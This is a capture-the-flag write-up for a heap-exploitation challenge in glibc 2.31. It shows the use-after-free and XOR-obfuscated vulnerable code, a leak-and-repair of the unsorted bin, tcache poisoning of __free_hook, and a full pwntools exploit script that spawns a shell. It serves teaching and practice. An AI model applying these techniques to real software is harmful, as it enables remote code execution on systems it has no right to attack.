# Challenge 03: Staff Chat - Writeup

## Challenge Overview
Medium-Hard pwn challenge featuring Use-After-Free (UAF), custom pointer obfuscation, and a "trap" involving Unsorted Bin corruption. The goal is to gain remote code execution in a GLIBC 2.31 environment.

## Vulnerability Analysis

### Binary Information
```bash
$ file chat
chat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, stripped

$ checksec --file=chat
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

### Core Vulnerabilities

#### 1. Use-After-Free (UAF)
The program allows users to `archive` a message, which calls `free()` on the message data buffer. However, the `view` and `edit` functions do not check if the message is archived, allowing interaction with freed memory.

```c
void cmd_view_message(int idx) {
    /* ... */
    // Allow viewing archived messages (UAF vulnerability)
    if (!m->data && !m->archived) {
        puts("[-] Empty slot.");
        return;
    }
    fwrite(m->data, 1, m->data_size, stdout);
}
```

#### 2. Custom Pointer Obfuscation (The XOR Logic)
To "harden" the application, the `archive` function XORs the first 8 bytes of the freed chunk with a key derived from the chunk's size.

```c
static uint64_t compute_key(const msg_t *m) {
    size_t chunk_sz = ((m->data_size + 0x10 + 0x0f) & ~(size_t)0x0f) | 1;
    return (uint64_t)chunk_sz ^ 0x4141414141414141ULL;
}

void cmd_archive_message(int idx) {
    /* ... */
    free(m->data);
    *(uint64_t *)(m->data) ^= compute_key(m); // Custom XOR "Protection"
    m->archived = 1;
}
```

### The "Unsorted Bin" Trap
If a player attempts to leak Libc by freeing a large chunk (size > 0x408) into the Unsorted Bin, the `archive` function XORs the `fd` pointer. In GLIBC 2.31, this corruption causes `malloc` to crash upon the next allocation because the doubly-linked list integrity is broken. To succeed, a player must "repair" the chunk using the `edit` UAF before calling `malloc` again.

---

## Exploitation Strategy

### Phase 1: Libc Leak & Heap Repair
1. **Allocate** a large chunk (size `0x420`) and a guard chunk.
2. **Archive** the large chunk to move it to the Unsorted Bin.
3. **Leak**: Use `view` to read the XORed `fd` pointer. Calculate `libc_base` by reversing the XOR.
4. **Repair**: Use `edit` to overwrite the corrupted `fd` and `bk` pointers with the original, uncorrupted `main_arena` address. This prevents a crash during the next allocation.

### Phase 2: Tcache Poisoning
1. **Allocate** two chunks of the same size (e.g., `0x60`).
2. **Archive** both to populate the tcache bin.
3. **Poison**: Use `edit` on the most recently freed chunk to overwrite its `fd` pointer with the address of `__free_hook`.
4. **Reclaim**: Allocate twice. The second allocation will return a pointer to `__free_hook`.
5. **Overwrite**: Write the address of `system` into `__free_hook`.

### Phase 3: Triggering Shell
1. **Allocate** a new message containing the string `"/bin/sh\x00"`.
2. **Archive** this message. The program calls `free("/bin/sh")`, which triggers `__free_hook("/bin/sh")`, effectively executing `system("/bin/sh")`.

---

## Exploit Script

```python
from pwn import *

# ... [Setup and Helpers] ...

def solve():
    p = remote('localhost', 13373)
    libc = ELF('./libc.so.6')
    
    # Phase 1: Leak & Repair
    LSIZE = 0x420
    create(p, LSIZE, b'A' * LSIZE) # Slot 0
    create(p, 0x20, b'G' * 0x20)    # Slot 1 (Guard)
    archive(p, 0)
    
    leak_data = view(p, 0, LSIZE)
    leak_val = u64(leak_data[:8]) ^ xor_key(LSIZE)
    libc.address = leak_val - 0x1ecbe0 
    
    # Heap Repair: Fix corrupted Unsorted Bin pointers
    edit(p, 0, LSIZE, p64(leak_val) * 2)
    
    # Phase 2: Tcache Poisoning
    PSIZE = 0x60
    create(p, PSIZE, b'B' * PSIZE) # Slot 2
    create(p, PSIZE, b'C' * PSIZE) # Slot 3
    archive(p, 3)
    archive(p, 2)
    
    edit(p, 2, PSIZE, p64(libc.sym['__free_hook']))
    create(p, PSIZE, b'dummy')
    create(p, PSIZE, p64(libc.sym['system']))
    
    # Phase 3: Shell
    create(p, 0x40, b'/bin/sh\x00') 
    archive(p, 6)
    p.interactive()
```

## Difficulty Assessment
- **Vulnerability Identification**: Easy (UAF is blatant).
- **Protection Bypass**: Medium (Requires reversing XOR logic).
- **Heap Management**: Hard (Requires identifying and fixing Unsorted Bin corruption).
- **Overall**: Medium-Hard.
